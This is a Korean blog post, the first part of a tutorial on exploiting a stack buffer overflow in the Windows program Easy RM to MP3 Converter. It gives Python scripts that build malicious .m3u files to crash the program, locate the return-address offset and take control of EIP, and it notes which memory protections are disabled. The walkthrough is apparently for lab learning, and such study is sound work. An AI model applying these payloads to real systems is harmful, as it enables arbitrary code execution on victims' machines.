---
title:  "Windows Stack Buffer Overflow 1 - 취약점 확인"
search: true
categories: ['Windows', 'Userland']
last_modified_at: 2025-06-05
comments: true 
published: true
---

취약한 프로그램을 이용하여 Windows Userland에서의 Stack Buffer Overflow Exploit을 실습해보자.

취약 프로그램은 <a target="_blank" href="https://www.exploit-db.com/exploits/10619">여기</a>서 다운로드받을 수 있다.

### 취약 파일 생성 코드

```py
import os
if os.path.exists("exploit.m3u"): os.remove("exploit.m3u")

with open("exploit.m3u", "wb") as f:
	f.write(b"A"*30000)
```
- "A"를 10000개, 20000개, 30000개씩 생성해보면서 프로그램에 로드해본다.
- "A"를 30000개 입력한 후 파일을 로드했을 때 프로그램이 비정상적으로 종료되었다.

### 디버거를 이용한 확인
- Easy RM to MP3 Converter 프로세스에 디버거를 Attach하고 파일을 로드해보면 다음과 같은 결과가 나온다.
  <img src="/assets/img/windows/sbof/1.png" class="post-image">
- EIP가 `0x41414141`로 이동하여 Access Violation이 발생했음을 알 수 있다.
- 적절한 조작을 통해 EIP를 원하는 주소로 컨트롤하여 임의 코드를 실행할 수 있다.

### 보호 기법 확인
- Sysinternals Suite의 Process Explorer를 이용하여 프로세스에 적용된 보호 기법을 확인한다.
  <img src="/assets/img/windows/sbof/2.png" class="post-image">
- DEP(Data Execution Prevention)가 비활성화되어 있고, ASLR(Address Space Layout Randomize), CFG(Control Flow Guard), Stack Protection이 모두 비활성화되어 있다.
- 스택에 셸코드를 입력하고 반환 주소를 셸코드 주소로 조작하면 임의 코드를 실행할 수 있다.

### 반환 주소 오프셋 확인
- 다음 코드를 이용하여 반환 주소의 오프셋을 확인한다.
```py
  import os
  if os.path.exists("exploit.m3u"): os.remove("exploit.m3u")

  with open("exploit.m3u", "wb") as f:
    f.write(b"A"*26000)
    for i in range(0x4242, 0x6969):
      now = (i << 16) + i
      f.write(now.to_bytes(4, "little"))
```
- EIP가 `0x42584257`로 이동했음을 확인할 수 있다.

<img src="/assets/img/windows/sbof/3.png" class="post-image" style="width: 440px">

- 아래 코드를 이용하면 정확히 반환 주소의 오프셋을 맞춰 EIP를 `0xffffffff`로 이동시킬 수 있다.
```py
  import os
  if os.path.exists("exploit.m3u"): os.remove("exploit.m3u")

  with open("exploit.m3u", "wb") as f:
    payload = b"A"*(26000+(0x57-0x42)*4+2)
    payload += b"\xFF\xFF\xFF\xFF"
    payload += b"B"*(28000-len(payload))
    f.write(payload)
```
<img src="/assets/img/windows/sbof/4.png" class="post-image" style="width: 440px">